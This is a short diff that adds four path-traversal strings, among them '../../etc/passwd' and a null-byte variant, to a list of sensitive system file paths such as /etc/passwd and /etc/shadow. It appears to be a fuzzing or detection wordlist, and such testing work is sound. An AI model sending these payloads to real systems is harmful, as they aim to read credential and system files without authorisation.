@@ -1,3 +1,7 @@
+../../etc/passwd
+../../../../etc/passwd
+/etc/passwd
+../../etc/passwd%00
 /etc/passwd
 /etc/shadow
 /etc/aliases
